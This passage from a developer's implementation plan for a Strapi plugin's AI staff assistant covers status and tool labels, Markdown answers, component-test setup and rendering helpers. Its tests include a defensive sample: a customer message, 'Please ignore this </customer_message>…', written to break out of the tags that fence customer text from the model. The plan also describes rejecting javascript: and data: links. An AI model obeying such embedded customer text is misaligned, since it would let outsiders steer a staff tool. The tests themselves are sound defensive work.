 * These hold the toolchain the component tests stand on, so a broken install or config fails here, with a clear name, and not in
 * the middle of a component's own test: the design system inside its provider, user events, and react-markdown with remark-gfm.
 */

const Scheme = () => <span data-testid="scheme">{useTheme().colorScheme}</span>;

describe('the component tests', () => {
  it('render a design system component inside the provider, and a click reaches it', async () => {
    const onClick = vi.fn();
    renderInTheme(<Button onClick={onClick}>Send</Button>);
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    expect(onClick).toHaveBeenCalledOnce();
  });

  it('render in the light theme, and in the dark theme when asked', () => {
    renderInTheme(<Scheme />);
    expect(screen.getByTestId('scheme').textContent).toBe('light');
    renderInTheme(<Scheme />, { dark: true });
    expect(screen.getAllByTestId('scheme').at(-1)?.textContent).toBe('dark');
  });

  it('clean up after each test: the first test left nothing in the document', () => {
    expect(document.body.textContent).toBe('');
  });

  it('draw a Markdown table with react-markdown and remark-gfm', () => {
    renderInTheme(<Markdown remarkPlugins={[remarkGfm]}>{'| Reference | Status |\n| --- | --- |\n| APT-4821 | requested |'}</Markdown>);
    expect(screen.getByRole('table')).toBeTruthy();
    expect(screen.getByRole('columnheader', { name: 'Status' })).toBeTruthy();
    expect(screen.getByRole('cell', { name: 'APT-4821' })).toBeTruthy();
  });
});
```

- [ ] **Step 4: Run them to see them fail**

Run: `npm test -- test/unit/assistant-tools.test.ts test/unit/assistant-controller.test.ts test/unit/assistant-stream.test.ts test/unit/assistant-instructions.test.ts test/unit/assistant-admin.test.ts test/unit/assistant-dependencies.test.ts test/unit/component-toolchain.test.tsx`
Expected: FAIL, `Test Files  6 failed (6)` and `Tests  27 failed | 340 passed (367)`. The new tests fail: the labels, `statusFor`, the Markdown lines, the tools in the admin status and the five packages are not there yet. The toolchain test is not found at all yet, because the config only includes `.test.ts` files.

- [ ] **Step 5: Add the labels, `statusFor` and the status route**

`server/src/assistant/tools.ts`: the labels, next to `READ_TOOL_NAMES`. A tool with no label shows under its own name, so a tool added later is never blank, and a test holds every offered tool to a label.

```diff
@@
 }
 
 export const READ_TOOL_NAMES = ['list_requests', 'list_questions', 'list_inquiries', 'inquiry_counts', 'search_knowledge', 'search_products', 'view_product'] as const;
+
+/** What staff call each tool, in the Ask tab's list of tools. A tool with no entry here is shown under its own name. */
+export const TOOL_LABELS: Record<string, string> = {
+  list_requests: 'Visit requests',
+  list_questions: 'Customer questions',
+  list_inquiries: 'Inquiries',
+  inquiry_counts: 'Inquiry counts',
+  search_knowledge: 'Product knowledge',
+  search_products: 'Product search',
+  view_product: 'Product details',
+};
+
+export const toolLabel = (name: string): string => (Object.prototype.hasOwnProperty.call(TOOL_LABELS, name) ? TOOL_LABELS[name] : name);
 
 /** How many rows a list gives when the model names no limit, and the most it may ask for. */
 const MAX_ROWS = ASSISTANT_LIMITS.listRows;
```

`server/src/services/assistant.ts`: `statusFor`. `status()` stays as it is, because `chat` in the controller asks only whether the assistant is ready.

```diff
@@
 import { notReadyReason, staffErrorOf, withoutKey, type RawRunError, type StaffError } from '../assistant/errors';
 import { instructions } from '../assistant/instructions';
 import { createAnthropicAdapter, loadSdk, toTools, type ChatAdapter, type ChatParams } from '../assistant/sdk';
-import { assistantTools, type Ability, type AssistantToolSpec } from '../assistant/tools';
+import { assistantTools, toolLabel, type Ability, type AssistantToolSpec } from '../assistant/tools';
 import { getConfig } from '../config';
 import { ASSISTANT_LIMITS } from '../constants';
 
@@
 
 export type AssistantStatus = { ready: true; model: string } | { ready: false; reason: string };
 
+/** A tool as the Ask tab lists it: its name, and what staff call it. */
+export interface ToolInfo {
+  name: string;
+  label: string;
+}
+
+/** What GET /assistant/status answers: the status, and for a ready assistant the tools this admin's chat gets. */
+export type AssistantStatusAnswer = { ready: true; model: string; tools: ToolInfo[] } | { ready: false; reason: string };
+
 /** How many messages staff have sent in a chat: the ones with the role `user`. The model's answers and the tool results are not counted. */
 export const countStaffMessages = (messages: ReadonlyArray<{ role?: string }>): number => messages.filter((message) => message.role === 'user').length;
 
@@
     });
   };
 
+  /**
+   * The status for one admin. A ready assistant also lists the tools this admin's chat really gets, which are the ones their
+   * role allows after `disabledTools`, never every tool the plugin has. An assistant that is not ready has none.
+   */
+  const statusFor = (ability: Ability): AssistantStatusAnswer => {
+    const current = status();
+    if (current.ready === false) return current;
+    return { ...current, tools: assistantTools(strapi, ability).map(({ name }) => ({ name, label: toolLabel(name) })) };
+  };
+
   return {
     status,
+    statusFor,
     errorResponse,
 
     /** The tools this admin may use. */
```

`server/src/controllers/assistant.ts`: the route answers `statusFor`, for the admin of the request.

```diff
@@
   };
 
   return {
-    /** GET /assistant/status: `{ ready: true, model }`, or `{ ready: false, reason }`. Never the key. */
+    /**
+     * GET /assistant/status: `{ ready: true, model, tools }`, or `{ ready: false, reason }`. `tools` is `{ name, label }` for each tool
+     * this admin's chat gets. Never the key.
+     */
     async status(ctx) {
-      ctx.body = assistant().status();
+      ctx.body = assistant().statusFor(ctx.state.userAbility ?? { can: () => false });
     },
 
     /**
```

- [ ] **Step 6: Change the instructions to Markdown**

`server/src/assistant/instructions.ts`: the one line "Reply in short plain text, with no Markdown. Reply in the language staff write in." becomes the spec's four sentences, then the language rule.

```diff
@@
     `Today is ${weekday} ${date} (${timezone}). Times in tool answers are in that time zone, written in ISO 8601 with their offset.`,
     `"Today" means since ${date}. "This week" means the last 7 days, today included: since ${addDays(date, -6)}.`,
     'You look things up and summarize them. You never send, confirm, answer, close or relabel anything. Staff do that with the buttons on this page.',
-    'Reply in short plain text, with no Markdown. Reply in the language staff write in.',
+    'Write in Markdown. When you list several items with the same fields, such as reference, customer, status and date, use a table. Otherwise use short paragraphs or a short list. Keep answers short. Never include images. Reply in the language staff write in.',
     'Use only what the tools return and what staff tell you. When you do not know, say so.',
     '',
     'Data:',
```

- [ ] **Step 7: Let the admin read the tools in the status**

`admin/src/assistant.ts`: `ToolInfo`, the status with `tools`, and `askTabState` with them. A ready status without a list of tools is not a status, so a page and a server that do not match show "Couldn't check the assistant" and not a tab with no tools.

```diff
@@
 /** The three questions the tab suggests while the chat is empty. */
 export const STARTERS: readonly string[] = ['What are customers asking about today?', 'Any complaints this week?', 'Which visits are waiting for staff?'];
 
-/** What GET /maison/assistant/status answers: ready with the model, or not ready with the reason. Never the key. */
-export type AssistantStatus = { ready: true; model: string } | { ready: false; reason: string };
+/** A tool as the status lists it: its name, and what staff call it. */
+export interface ToolInfo {
+  name: string;
+  label: string;
+}
+
+/**
+ * What GET /maison/assistant/status answers: ready, with the model and the tools this admin's chat gets, or not ready with
+ * the reason. Never the key.
+ */
+export type AssistantStatus = { ready: true; model: string; tools: ToolInfo[] } | { ready: false; reason: string };
+
+const isToolInfo = (value: unknown): value is ToolInfo => {
+  if (typeof value !== 'object' || value === null) return false;
+  const { name, label } = value as Record<string, unknown>;
+  return typeof name === 'string' && typeof label === 'string';
+};
 
 export const isStatus = (value: unknown): value is AssistantStatus => {
   if (typeof value !== 'object' || value === null || Array.isArray(value)) return false;
-  const { ready, model, reason } = value as Record<string, unknown>;
-  return (ready === true && typeof model === 'string') || (ready === false && typeof reason === 'string');
+  const { ready, model, reason, tools } = value as Record<string, unknown>;
+  if (ready === true) return typeof model === 'string' && Array.isArray(tools) && tools.every(isToolInfo);
+  return ready === false && typeof reason === 'string';
 };
 
 /** What the tab shows: the check is running, the check failed, the assistant is not set up (a notice and no text box), or the chat. */
@@
   | { kind: 'loading' }
   | { kind: 'failed'; text: string }
   | { kind: 'not-ready'; text: string }
-  | { kind: 'chat'; model: string };
+  | { kind: 'chat'; model: string; tools: ToolInfo[] };
 
 /** A status the tab already has is kept when a later check fails: the chat stays as it was. */
 export const askTabState = (status: AssistantStatus | null, statusError: string | null): AskTabState => {
-  if (status) return status.ready ? { kind: 'chat', model: status.model } : { kind: 'not-ready', text: status.reason };
+  if (status) return status.ready ? { kind: 'chat', model: status.model, tools: status.tools } : { kind: 'not-ready', text: status.reason };
   if (statusError) return { kind: 'failed', text: `Couldn't check the assistant: ${statusError}` };
   return { kind: 'loading' };
 };
```

- [ ] **Step 8: Install the packages**

From the plugin folder. These commands download packages from the npm registry: if the session does not allow that, stop and ask Paul. The first command adds the two Markdown packages to `dependencies`, the second the test packages to `devDependencies`. The third removes the plugin's own copy of `@strapi/utils` that npm puts back, so the plugin shares the app's, and the fourth checks it. The last shows one copy of the SDK, and the new packages.

```bash
npm install --save react-markdown@^9.1.0 remark-gfm@^4.0.1
npm install --save-dev jsdom@^25.0.1 @testing-library/react@^16.3.2 @testing-library/user-event@^14.6.1
node ../../../scripts/share-strapi-utils.mjs
node ../../../scripts/share-strapi-utils.mjs --check
npm ls @tanstack/ai react-markdown remark-gfm jsdom
```

Expected: every command exits 0. `--check` says `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.` `npm ls` shows `@tanstack/ai@0.52.3` once (other packages may list it as deduped), `react-markdown@9.1.0`, `remark-gfm@4.0.1` and `jsdom@25.x`. `package.json` changes like this (npm writes them in this order, and `package-lock.json` changes with it):

```diff
@@
     "@strapi/sdk-plugin": "^6.1.1",
     "@strapi/strapi": "^5.55.1",
     "@strapi/typescript-utils": "^5.55.1",
+    "@testing-library/react": "^16.3.2",
+    "@testing-library/user-event": "^14.6.1",
     "@types/react": "^18.3.31",
     "@types/react-dom": "^18.3.7",
+    "jsdom": "^25.0.1",
     "prettier": "^3.9.9",
     "react": "^18.3.1",
     "react-dom": "^18.3.1",
@@
     "@tanstack/ai-anthropic": "0.18.3",
     "@tanstack/ai-client": "0.29.2",
     "@tanstack/ai-react": "0.22.4",
-    "ai": "^7.0.127"
+    "ai": "^7.0.127",
+    "react-markdown": "^9.1.0",
+    "remark-gfm": "^4.0.1"
   }
 }
```

- [ ] **Step 9: Let Vitest run component tests**

`vitest.config.ts`. Three things, each for a reason. `esbuild.jsx: 'automatic'`, because the admin's components have no `import React`, as the plugin's own build has it. `include` takes `.test.tsx`. And the three Strapi packages whose `package.json` says `"type": "module"` but whose `main` is a CommonJS file (`@strapi/design-system`, `@strapi/icons`, `@strapi/ui-primitives`): Node cannot load that, so the config points each to its ES module entry and has Vite process them, which also lets their imports of CommonJS packages such as lodash work. The server tests are not affected: they run in the node environment and import none of these.

```diff
@@
+import path from 'node:path';
+
 import { defineConfig } from 'vitest/config';
 
+/** The ES module entry of a package whose `main` is a CommonJS file under "type": "module", which Node can't load. */
+const esEntry = (name: string) => path.resolve(__dirname, 'node_modules', name, 'dist', 'index.mjs');
+
 export default defineConfig({
+  // The admin's components use the automatic JSX runtime, as the plugin's own build does. Vitest needs telling separately.
+  esbuild: { jsx: 'automatic' },
+  resolve: {
+    // These three packages have "type": "module" and a `main` that is a CommonJS file, so Node can't load them. Their ES module
+    // entries are what the Strapi admin's own build uses.
+    alias: [
+      { find: /^@strapi\/design-system$/, replacement: esEntry('@strapi/design-system') },
+      { find: /^@strapi\/icons$/, replacement: esEntry('@strapi/icons') },
+      { find: /^@strapi\/ui-primitives$/, replacement: esEntry('@strapi/ui-primitives') },
+    ],
+  },
   test: {
-    include: ['test/unit/**/*.test.ts'],
+    include: ['test/unit/**/*.test.{ts,tsx}'],
     environment: 'node',
+    // Vite processes them, so their imports of CommonJS packages such as lodash work as they do in the admin's build. The component
+    // tests choose jsdom for themselves, with `// @vitest-environment jsdom` on their first line.
+    server: { deps: { inline: [/@strapi\/(design-system|icons|ui-primitives)/] } },
   },
 });
```

- [ ] **Step 10: Run the tests again**

Run: `npm test -- test/unit/assistant-tools.test.ts test/unit/assistant-controller.test.ts test/unit/assistant-stream.test.ts test/unit/assistant-instructions.test.ts test/unit/assistant-admin.test.ts test/unit/assistant-dependencies.test.ts test/unit/component-toolchain.test.tsx`
Expected: PASS, `Test Files  7 passed (7)` and `Tests  371 passed (371)`.

- [ ] **Step 11: Run everything**

Run: `npm test`
Expected: PASS, `Test Files  95 passed (95)` and `Tests  2849 passed (2849)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 12: Prove the tests can fail**

Make each change, run the tests named, see them fail, and undo the change.

In `server/src/services/assistant.ts`, in `statusFor`, give `assistantTools` an ability that allows everything: `assistantTools(strapi, { can: () => true })`.

Run: `npm test -- test/unit/assistant-controller.test.ts test/unit/assistant-stream.test.ts`
Expected: FAIL, among others: `assistant.status > lists the tools this admin's chat really gets: only what their role allows`; `assistant.status > lists no tools when the context has no ability at all`; `statusFor > lists the same tools a turn offers the model: the admin's permissions and disabledTools both count`.

In `server/src/assistant/instructions.ts`, change "Write in Markdown." to "Write in plain text."

Run: `npm test -- test/unit/assistant-instructions.test.ts`
Expected: FAIL, among others: `what the assistant does and never does > answers in Markdown, with a table for items that have the same fields and short text otherwise, and never an image`; `what the assistant does and never does > no longer asks for plain text with no Markdown`.

In `admin/src/assistant.ts`, make `isStatus` accept any `tools`: replace `Array.isArray(tools) && tools.every(isToolInfo)` with `true`.

Run: `npm test -- test/unit/assistant-admin.test.ts`
Expected: FAIL, among others: `isStatus > is {"ready":true,"model":"claude-sonnet-5-5"}: false`; `isStatus > is {"ready":true,"model":"claude-sonnet-5-5","tools":"list_requests"}: false`; `isStatus > is {"ready":true,"model":"claude-sonnet-5-5","tools":["list_requests"]}: false`.

- [ ] **Step 13: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/assistant.ts strapi/src/plugins/maison/package-lock.json strapi/src/plugins/maison/package.json strapi/src/plugins/maison/server/src/assistant/instructions.ts strapi/src/plugins/maison/server/src/assistant/tools.ts strapi/src/plugins/maison/server/src/controllers/assistant.ts strapi/src/plugins/maison/server/src/services/assistant.ts strapi/src/plugins/maison/test/unit/assistant-admin.test.ts strapi/src/plugins/maison/test/unit/assistant-controller.test.ts strapi/src/plugins/maison/test/unit/assistant-dependencies.test.ts strapi/src/plugins/maison/test/unit/assistant-instructions.test.ts strapi/src/plugins/maison/test/unit/assistant-stream.test.ts strapi/src/plugins/maison/test/unit/assistant-tools.test.ts strapi/src/plugins/maison/test/unit/component-toolchain.test.tsx strapi/src/plugins/maison/test/unit/render.tsx strapi/src/plugins/maison/vitest.config.ts
git commit -m "maison: the status answer lists the assistant's tools, answers are Markdown, and the packages and toolchain for the component tests" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/assistant.ts strapi/src/plugins/maison/package-lock.json strapi/src/plugins/maison/package.json strapi/src/plugins/maison/server/src/assistant/instructions.ts strapi/src/plugins/maison/server/src/assistant/tools.ts strapi/src/plugins/maison/server/src/controllers/assistant.ts strapi/src/plugins/maison/server/src/services/assistant.ts strapi/src/plugins/maison/test/unit/assistant-admin.test.ts strapi/src/plugins/maison/test/unit/assistant-controller.test.ts strapi/src/plugins/maison/test/unit/assistant-dependencies.test.ts strapi/src/plugins/maison/test/unit/assistant-instructions.test.ts strapi/src/plugins/maison/test/unit/assistant-stream.test.ts strapi/src/plugins/maison/test/unit/assistant-tools.test.ts strapi/src/plugins/maison/test/unit/component-toolchain.test.tsx strapi/src/plugins/maison/test/unit/render.tsx strapi/src/plugins/maison/vitest.config.ts
```


---

### Task 2: The new pure helpers: tool boxes, customer tags, links, tool notes and the "Working on it…" rule

**Group:** Step 1b. The rules the next tasks draw on the screen, as pure functions with unit tests. Every existing helper and its tests stay as they are.

Read first: the spec's rebuild section ("Messages", "Waiting", "Tool boxes"); `admin/src/assistant.ts` (`toolLineOf`, `failureMessage`, `drawableParts`, `showsWorking`, `toolResultOf`); `server/src/domain/fence.ts` (the four tags) and `server/src/assistant/views.ts` (what a result looks like); R/`admin/src/components/ToolCallDisplay.tsx:191-231` and the map's section 1.7.

**Files:**
- Modify: `admin/src/assistant.ts`
- Test: create `test/unit/assistant-rendering.test.ts`

**Interfaces:**
- Consumes (built): `PartLike`, `MessageLike`, `toolLineOf`, `toolResultOf`, `UNREADABLE_REQUEST` and the private `failureMessage` in `admin/src/assistant.ts`; `ToolInfo` (Task 1). Tests only: `FENCED_TAGS` and `fence` (`server/src/domain/fence.ts`), `TOOL_LABELS` (`server/src/assistant/tools.ts`), and the views `inquiryView`, `questionView` and `requestView` (`server/src/assistant/views.ts`).
- Produces, all exported from `admin/src/assistant.ts`:
  ```ts
  export const CUSTOMER_TAGS: readonly ['customer_message', 'customer_question', 'customer_note', 'concierge_reply'];  // a test holds it to the server's FENCED_TAGS
  export const withoutCustomerTags: (value: unknown) => unknown;   // a new value: every string in it loses the four tags and keeps the text inside them
  export const WAITING_FOR_RESULT = 'Waiting for result...';
  export interface ToolBoxModel {
    name: string;                                  // shown after "Tool: "
    state: 'running' | 'done' | 'failed';
    status: string | null;                         // header, at the right: null while it runs, then "3 results", "1 result", "done", or "failed"
    body: string;                                  // the wait, the failure's message, or the result as indented JSON without the tags
  }
  export const toolBoxOf: (call: PartLike, result: PartLike | undefined) => ToolBoxModel | null;   // null where toolLineOf is null
  export const TOOL_NOTES: Record<string, string>;                // one line for staff under each tool in the list of tools
  export const toolNoteOf: (name: string) => string | null;
  export const safeLink: (href: string | null | undefined) => string | null;   // the address as the browser reads it, for http: and https: only
  export const showsToolWait: (busy: boolean, messages: readonly MessageLike[]) => boolean;
  ```
- Rules: the box's state, count and failure text come from the same reading of the call as the tool line (`toolLineOf` is refactored onto one internal `outcomeOf`, so the two never disagree); a failed call shows Maison's own `output.error.message`, or "Maison could not read that request." for TanStack AI's own failure strings, never TanStack AI's text; a done call shows `JSON.stringify(withoutCustomerTags(output), null, 2)`; `safeLink` answers `url.href` for a parsed `http:` or `https:` address and `null` for anything else, a relative address and `mailto:` included; `showsToolWait` is true only for the last message, an assistant message that already has text and a tool that still runs, while the assistant is answering.
- Decisions made here: the one line of staff text under each tool is `TOOL_NOTES`, in the admin, with a unit test that holds its keys to the server's `TOOL_LABELS`, so no tool has a label and no note.

**Review Focus covered here:** 1. Hostile text. `safeLink` (no `javascript:`, `data:`, `mailto:`, `tel:`, relative or protocol-relative address, and the odd spellings: upper case, a leading space, a tab inside the word) and `withoutCustomerTags` (the four tags go, the text stays, `&lt;customer_message>` that a customer wrote stays as it is, the server's own views are cleaned, and the input is never changed). Pinned in `assistant-rendering.test.ts` by the `safeLink` tests (`is not a link for ...`, once for every address in the list) and by `withoutCustomerTags > takes the tags out of a string and keeps the text inside them`, `... keeps the text a customer wrote that only looks like a tag`, `... clears the views the server gives the model, and leaves the customer text in them` and `... makes a new value and never changes the one it was given`.

- [ ] **Step 1: Write the failing tests**

Create `test/unit/assistant-rendering.test.ts`. It builds parts in the shapes TanStack AI keeps (a call has `id`, `name`, `state` and, once finished, `output`; a result part has `toolCallId`, `state` and `content`), and it runs the server's real views through `withoutCustomerTags`.

```ts
import { describe, expect, it } from 'vitest';
import {
  CUSTOMER_TAGS,
  TOOL_NOTES,
  UNREADABLE_REQUEST,
  WAITING_FOR_RESULT,
  safeLink,
  showsToolWait,
  toolBoxOf,
  toolLineOf,
  toolNoteOf,
  withoutCustomerTags,
  type MessageLike,
  type PartLike,
} from '../../admin/src/assistant';
import { TOOL_LABELS } from '../../server/src/assistant/tools';
import { inquiryView, questionView, requestView } from '../../server/src/assistant/views';
import { FENCED_TAGS, fence } from '../../server/src/domain/fence';

type Doc = Record<string, any>;

// The shapes TanStack AI keeps in a UIMessage: a call has an `output` once it has finished, and a tool-result part beside it.
const call = (name: string, fields: Partial<PartLike> = {}): PartLike => ({ type: 'tool-call', id: 'call-1', name, arguments: '{}', state: 'complete', ...fields });
const resultPart = (fields: Partial<PartLike> = {}): PartLike => ({ type: 'tool-result', toolCallId: 'call-1', state: 'complete', content: '{}', ...fields });
const rows = (count: number) => Array.from({ length: count }, (_, index) => ({ n: index }));

describe('CUSTOMER_TAGS', () => {
  it("are the four tags the server wraps customer text in: a unit test holds the page's copy to the server's", () => {
    expect([...CUSTOMER_TAGS]).toEqual([...FENCED_TAGS]);
  });
});

describe('withoutCustomerTags', () => {
  it('takes the tags out of a string and keeps the text inside them', () => {
    expect(withoutCustomerTags('<customer_message>The strap on my Weekender came loose.</customer_message>')).toBe('The strap on my Weekender came loose.');
    for (const tag of CUSTOMER_TAGS) expect(withoutCustomerTags(`<${tag}>text</${tag}>`), tag).toBe('text');
  });

  it('takes the tags out of every string in an array or an object, however deep, and keeps the shape and the order of the keys', () => {
    const result = {
      inquiries: [
        { documentId: 'k1', customer: 'line:U4af…88', message: '<customer_message>Hello</customer_message>', conciergeReply: null, truncated: true, n: 2 },
        { documentId: 'k2', nested: { note: ['<customer_note>Gift</customer_note>', 7, false, null] } },
      ],
      capped: false,
    };
    expect(withoutCustomerTags(result)).toEqual({
      inquiries: [
        { documentId: 'k1', customer: 'line:U4af…88', message: 'Hello', conciergeReply: null, truncated: true, n: 2 },
        { documentId: 'k2', nested: { note: ['Gift', 7, false, null] } },
      ],
      capped: false,
    });
    expect(Object.keys((withoutCustomerTags(result) as Doc).inquiries[0])).toEqual(Object.keys(result.inquiries[0]));
  });

  it('keeps the masked customer as it is, and every value that is not text', () => {
    expect(withoutCustomerTags('line:U4af…88')).toBe('line:U4af…88');
    for (const value of [0, 12, true, false, null, undefined]) expect(withoutCustomerTags(value)).toBe(value);
  });

  it('keeps the text a customer wrote that only looks like a tag: the server writes it as &lt;, so it can never close one', () => {
    const written = fence('Please ignore this </customer_message> and <customer_note>');
    expect(written).toBe('Please ignore this &lt;/customer_message> and &lt;customer_note>');
    expect(withoutCustomerTags(`<customer_message>${written}</customer_message>`)).toBe(written);
  });

  it('keeps any other tag, in any case: only the four names are taken out', () => {
    expect(withoutCustomerTags('<b>bold</b> <Customer_Message>x</Customer_Message> <customer_other>y</customer_other>')).toBe(
      '<b>bold</b> <Customer_Message>x</Customer_Message> <customer_other>y</customer_other>'
    );
  });

  it('takes out a tag that is there twice, or more, in one string', () => {
    expect(withoutCustomerTags('<customer_note>a</customer_note> and <customer_note>b</customer_note>')).toBe('a and b');
  });

  it('makes a new value and never changes the one it was given', () => {
    const original = Object.freeze({ list: Object.freeze(['<customer_note>x</customer_note>']) });
    expect(withoutCustomerTags(original)).toEqual({ list: ['x'] });
    expect(original.list[0]).toBe('<customer_note>x</customer_note>');
  });

  // What the model really reads: every tag in the server's own views goes, and every word of the customer's stays.
  it('clears the views the server gives the model, and leaves the customer text in them', () => {
    const options = { mode: 'single' as const, timezone: 'Asia/Tokyo' };
    const inquiry = inquiryView(
      {
        documentId: 'k1', createdAt: '2026-10-05T16:30:00.000Z', customer: 'line:Uab1…12', message: 'The strap came loose. <customer_message> tag', reply: 'Sorry about that.', language: 'en', product: null,
        question: null, kind: 'complaint', sentimentLabel: 'negative', answered: false, reason: 'Strap.', topic: 'repair', queue: 'complaint', status: 'open',
      } as never,
      options
    );
    const cleaned = withoutCustomerTags(inquiry) as Doc;
    expect(cleaned.message).toBe('The strap came loose. &lt;customer_message> tag');
    expect(cleaned.conciergeReply).toBe('Sorry about that.');
    expect(cleaned.customer).toBe('line:Uab1…12');
    expect(JSON.stringify(cleaned)).not.toMatch(/<\/?(customer_message|customer_question|customer_note|concierge_reply)>/);

    const question = questionView(
      { reference: 'Q-4821', status: 'open', customer: 'line:Uab1…12', product: null, question: 'Can it be monogrammed?', reason: 'no_answer', language: 'en', createdAt: '2026-10-05T16:30:00.000Z' } as never,
      options
    );
    expect((withoutCustomerTags(question) as Doc).question).toBe('Can it be monogrammed?');

    const request = requestView(
      { reference: 'APT-4821', status: 'requested', customer: 'line:Uab1…12', boutique: null, requestedFor: '2026-10-10T14:00:00+09:00', products: [], note: 'For my father.', createdAt: '2026-10-05T16:30:00.000Z' } as never,
      options
    );
    expect((withoutCustomerTags(request) as Doc).note).toBe('For my father.');
  });
});

describe('toolBoxOf', () => {
  it('is a box that waits while the call runs: no status, because a spinner shows, and the wait in its body', () => {
    for (const state of ['awaiting-input', 'input-streaming', 'input-complete']) {
      expect(toolBoxOf(call('list_requests', { state }), undefined), state).toEqual({ name: 'list_requests', state: 'running', status: null, body: WAITING_FOR_RESULT });
    }
    expect(WAITING_FOR_RESULT).toBe('Waiting for result...');
  });

  it('says how many results a finished list gave, and shows them as JSON', () => {
    const output = { requests: rows(3), capped: false };
    expect(toolBoxOf(call('list_requests', { output }), undefined)).toEqual({
      name: 'list_requests',
      state: 'done',
      status: '3 results',
      body: JSON.stringify(output, null, 2),
    });
    expect(toolBoxOf(call('list_requests', { output }), undefined)?.body).toContain('\n  "requests": [');
  });

  it('says "1 result" for one and "0 results" for none, as the tool line does', () => {
    expect(toolBoxOf(call('list_questions', { output: { questions: rows(1), capped: false } }), undefined)?.status).toBe('1 result');
    expect(toolBoxOf(call('list_questions', { output: { questions: [], capped: false } }), undefined)?.status).toBe('0 results');
    expect(toolBoxOf(call('search_knowledge', { output: { locale: 'en', entries: rows(4) } }), undefined)?.status).toBe('4 results');
  });

  it('says "done" for the two tools that give no rows to count, and still shows what they gave', () => {
    const counts = { needsAnswer: 4, complaint: 2, praise: 1, notLabelled: 3 };
    expect(toolBoxOf(call('inquiry_counts', { output: counts }), undefined)).toEqual({ name: 'inquiry_counts', state: 'done', status: 'done', body: JSON.stringify(counts, null, 2) });
    expect(toolBoxOf(call('view_product', { output: { product: { slug: 'weekender-50' } } }), undefined)?.status).toBe('done');
    expect(toolBoxOf(call('list_inquiries', { output: { inquiries: 'not a list' } }), undefined)?.status).toBe('done');
  });

  it('shows the result with the customer-text tags taken out, and the masked customer as it is', () => {
    const output = { inquiries: [{ documentId: 'k1', customer: 'line:U4af…88', message: '<customer_message>The clasp broke.</customer_message>' }], capped: false };
    const body = toolBoxOf(call('list_inquiries', { output }), undefined)?.body ?? '';
    expect(body).toContain('"message": "The clasp broke."');
    expect(body).toContain('"customer": "line:U4af…88"');
    expect(body).not.toContain('customer_message');
    // The output itself is untouched: the saved chat still has what the model read.
    expect(output.inquiries[0].message).toBe('<customer_message>The clasp broke.</customer_message>');
  });

  it("shows Maison's own message for a failed call, and marks it failed", () => {
    const output = { error: { code: 'not_found', message: 'No request APT-4812.', hint: 'Check the reference.' } };
    expect(toolBoxOf(call('list_requests', { output }), undefined)).toEqual({ name: 'list_requests', state: 'failed', status: 'failed', body: 'No request APT-4812.' });
  });

  it("never shows TanStack AI's own text for a call it refused: a fixed sentence says it could not be read", () => {
    for (const error of ['Input validation failed for tool list_requests: Too big: expected number to be <=50', 'Failed to parse tool arguments as JSON: {"reference": "APT-48', 'Tool execution failed']) {
      const box = toolBoxOf(call('list_requests', { state: 'error', output: { error } }), resultPart({ state: 'error', error }));
      expect(box, error).toEqual({ name: 'list_requests', state: 'failed', status: 'failed', body: UNREADABLE_REQUEST });
    }
  });

  it('says "The tool failed." when a failure carries no message, from the state or from the result part', () => {
    expect(toolBoxOf(call('list_questions', { state: 'error' }), undefined)?.body).toBe('The tool failed.');
    expect(toolBoxOf(call('list_questions'), resultPart({ state: 'error', error: 'x' }))).toMatchObject({ state: 'failed', body: 'The tool failed.' });
  });

  it('reads the result part when the call has no output of its own: its content is JSON, or text', () => {
    const decoded = toolBoxOf(call('list_requests'), resultPart({ content: '{"requests":[{"reference":"APT-4821"}],"capped":false}' }));
    expect(decoded?.state).toBe('done');
    expect(decoded?.body).toBe(JSON.stringify({ requests: [{ reference: 'APT-4821' }], capped: false }, null, 2));
    expect(toolBoxOf(call('list_requests'), resultPart({ content: 'not json' }))?.body).toBe('"not json"');
    expect(toolBoxOf(call('list_requests'), undefined)?.body).toBe('');
  });

  it('has the same state and the same count as the tool line, for every case: they say one thing', () => {
    const cases: Array<[PartLike, PartLike | undefined]> = [
      [call('list_inquiries', { state: 'input-streaming' }), undefined],
      [call('list_inquiries', { output: { inquiries: rows(12), capped: false } }), undefined],
      [call('list_inquiries', { output: { inquiries: rows(1), capped: false } }), undefined],
      [call('inquiry_counts', { output: {} }), undefined],
      [call('list_requests', { output: { error: { message: 'No request APT-4812.' } } }), undefined],
      [call('list_requests', { state: 'error', output: { error: 'Input validation failed for tool list_requests' } }), undefined],
    ];
    const marks = { running: '…', done: '✓', failed: '✕' } as const;
    for (const [part, result] of cases) {
      const line = toolLineOf(part, result);
      const box = toolBoxOf(part, result);
      expect(line, JSON.stringify(part)).not.toBeNull();
      expect(box, JSON.stringify(part)).not.toBeNull();
      expect(line?.text).toContain(marks[box!.state]);
      if (box!.state === 'done' && box!.status !== 'done') expect(line?.text.endsWith(box!.status!)).toBe(true);
      if (box!.state === 'failed') expect(line?.text.endsWith(box!.body)).toBe(true);
    }
  });

  it('has no box for the draft tools, for any other name, or for a part that is not a tool call: the same parts that have no line', () => {
    for (const name of ['draft_reply', 'draft_answer', 'confirm_appointment', 'something_else', '', 'toString', '__proto__']) expect(toolBoxOf(call(name), undefined), name).toBeNull();
    expect(toolBoxOf({ type: 'text', content: 'Hello' }, undefined)).toBeNull();
    expect(toolBoxOf({ type: 'tool-result', toolCallId: 'call-1', name: 'list_requests' }, undefined)).toBeNull();
  });
});

describe('TOOL_NOTES', () => {
  it('have one plain line for each tool the server labels, and none for any other', () => {
    expect(Object.keys(TOOL_NOTES).sort()).toEqual(Object.keys(TOOL_LABELS).sort());
  });

  it('are short sentences with no tool name, no dash and no line break', () => {
    for (const [name, note] of Object.entries(TOOL_NOTES)) {
      expect(note, name).toMatch(/\.$/);
      expect(note.length, name).toBeLessThanOrEqual(110);
      expect(note, name).not.toMatch(/_|\u2014|\u2013|\n/);
    }
  });

